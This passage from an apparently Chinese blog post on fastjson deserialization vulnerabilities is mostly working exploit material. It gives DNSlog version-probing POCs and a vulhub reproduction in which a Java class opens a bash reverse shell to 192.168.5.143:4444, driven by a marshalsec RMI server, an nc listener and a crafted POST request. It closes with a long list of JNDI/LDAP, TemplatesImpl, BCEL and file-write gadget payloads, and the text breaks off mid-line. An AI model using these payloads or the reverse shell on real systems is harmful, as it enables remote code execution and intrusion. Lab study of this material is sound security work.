href="#fastjson1-2-47" class="headerlink" title="fastjson1.2.47"></a>fastjson1.2.47</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;su18&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;su19&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="fastjson版本探测"><a href="#fastjson版本探测" class="headerlink" title="fastjson版本探测"></a>fastjson版本探测</h2><h4 id="DNSlog探测"><a href="#DNSlog探测" class="headerlink" title="DNSlog探测"></a>DNSlog探测</h4><ol><li><p>以下POC出网，说明fastjson&lt;&#x3D;1.2.47</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetAddress&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;1247.xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>以下这个POC出网，说明fastjson&gt;&#x3D;1.2.37</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://weffewfddd.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>以下这个POC出网，证明fastjson版本号1.1.16&lt;&#x3D;version&lt;&#x3D;1.2.24</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://xxxdsf.dnslog.cn:9999/POC&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>以下这几个POC，只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;sdffsd.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetSocketAddress&quot;</span><span class="punctuation">&#123;</span><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;wefewffw.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="报错判断"><a href="#报错判断" class="headerlink" title="报错判断"></a>报错判断</h4><ol><li><p>提交一下两个POC，会抛出异常，有时候会显示出fastjson版本号来。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">]</span> </span><br><span class="line"></span><br><span class="line">输入一些乱码字符，让web应用报错，有时候也会带出来版本号</span><br></pre></td></tr></table></figure></li></ol><h2 id="vulhub漏洞复现"><a href="#vulhub漏洞复现" class="headerlink" title="vulhub漏洞复现"></a>vulhub漏洞复现</h2><h4 id="fastjson1-2-24-1"><a href="#fastjson1-2-24-1" class="headerlink" title="fastjson1.2.24"></a>fastjson1.2.24</h4><ol><li><p>docker启动环境</p></li><li><p>kali创建TouchFile文件用来反弹shell。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">             <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.5.143/4444 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">             p.waitFor();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> </span><br><span class="line">           <span class="comment">// do nothing</span></span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>python起一个http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer</span><br></pre></td></tr></table></figure></li><li><p>marshalsec启动RMI服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.110.141:4433/#TouchFile&quot; 9988</span><br></pre></td></tr></table></figure></li><li><p>kali上用NC开启端口监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure></li><li><p>抓包改为POST包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.110.141:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 165</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.110.141:9988/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>弹到shell</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220829225041536.png" alt="image-20220829225041536"></p></li></ol><h4 id="fastjson1-2-27"><a href="#fastjson1-2-27" class="headerlink" title="fastjson1.2.27"></a>fastjson1.2.27</h4><h2 id="payload总结"><a href="#payload总结" class="headerlink" title="payload总结"></a>payload总结</h2><p>JdbcRowSetImpl</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>TemplatesImpl</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgA...k=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;_name&#x27;<span class="punctuation">:</span> &#x27;su18&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;_tfactory&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiDataSourceFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>SimpleJndiBeanFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;targetBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;propertyPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>DefaultBeanFactoryPointcutAdvisor</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">     <span class="punctuation">]</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;adviceBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>WrapperConnectionPoolDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap:aced000...6f;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiRefForwardingDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loginTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>InetAddress</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.InetAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Inet6Address</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>URL</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JSONObject</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>URLReader</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;poc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:9999&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable 任意文件写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/target&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filecontent&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>BasicDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span> <span class="punctuation">:</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiConverter</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AsText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JtaTransactionConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiObjectFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AnterosDBCPConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AnterosDBCPConfig2</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>CacheJndiTmLookup</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 